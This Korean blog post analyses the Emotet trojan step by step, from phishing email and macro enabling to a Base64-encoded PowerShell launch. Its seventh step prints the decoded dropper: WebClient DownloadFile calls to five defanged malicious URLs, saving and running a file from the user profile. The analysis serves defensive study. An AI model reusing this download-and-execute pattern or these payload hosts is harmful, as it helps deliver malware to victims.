---
date: 2022-10-13T04:00:00
description: 
featured_image: 
tags: 
title: "Emotet 악성코드 분석"
---

![01](https://github.com/user-attachments/assets/e2c1e64f-1c3b-4fa0-abc7-6e06c9cb5ada)

## Emotet(이모텟)?

- 주로 이메일을 통해 확산되는 트로이 목마
- 합법적인 이메일처럼 보이도록 가장하여 사용자가 악성 파일을 클릭하도록 유도
- 트로이 목마를 업데이트하고 기본적으로 시스템에 액세스한 다음 운영자가 추가 페이로드를 다운로드할 수 있도록 하는 악성코드 유형인 "로더"로 작동하도록 구성
- 감염된 호스트에서 은행 자격 증명을 훔치거나, 피해자들로부터 돈을 갈취하는 것을 목표로 동작

<br>

## Emotet 실행/분석

### 1. 사회 공학 기법을 이용해 공격 대상에게 메일 발송
![02](https://github.com/user-attachments/assets/5dae9811-e676-4697-b7ee-a84f229d9b2b)
<br><br>


### 2. 공격 대상은 의심없이 첨부 파일 다운로드
![03](https://github.com/user-attachments/assets/e647b197-5a0b-47da-abd9-f13709fc17fc)
<br><br>


### 3. 파일 Open. 매크로 실행을 위해 'Enable Content' 클릭
![04](https://github.com/user-attachments/assets/7f4d218d-10d8-4d50-a008-31c9ee7e304f)
<br><br>


### 4. Base64 인코딩된 코드 PowerShell 프로세스로 실행 시도
![05](https://github.com/user-attachments/assets/80f38782-331a-49e3-aebc-9ba41e7a2c36)
<br><br>


### 5. PowerShell 명령어에 의해 conhost 실행
![06](https://github.com/user-attachments/assets/86c4c82b-baae-45af-b68b-e9cea82786aa)

![07](https://github.com/user-attachments/assets/ad597df8-9608-4995-9dfa-b6b38545088e)
<br><br>


### 6. PowerShell 스크립트 코드 실행
![08](https://github.com/user-attachments/assets/54c535af-f81f-44d5-870e-d7d9e5de3d84)
<br><br>


### 7. PowerShell 스크립트 코드 분석
![09](https://github.com/user-attachments/assets/e875c2f5-5371-41d6-97ea-f31777ccc789)
<br>

1) 아래 URL 에서 파일 다운로드
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxp://blockchainjoblist.com/wp-admin/014080/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://womenempowermentpakistan.com/wp-admin/paba5q52/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://atnimanvilla.com/wp-content/073735/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://yeuquynhnhai.com/upload/41830/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://deepikarai.com/js/4bzs6/)

2) 아래 경로에 파일 저장
$env:userprofile\284.exe

3) 23931 bytes 이상이면 실행
(Get-Item $env:userprofile\284.exe).LeNgTh -ge 23931

<br>

### 8. 사용자 폴더에 파일 생성
![010](https://github.com/user-attachments/assets/c0522f7e-2c7c-4751-90c5-a3780de0902b)

![011](https://github.com/user-attachments/assets/3bf9893f-d832-4331-bc2b-5be171e84f9e)

![012](https://github.com/user-attachments/assets/773bc501-4236-4bbc-9766-510595828a77)
<br>

## [참조]
- https://en.wikipedia.org/wiki/Emotet<br>
- https://www.malwarebytes.com/emotet

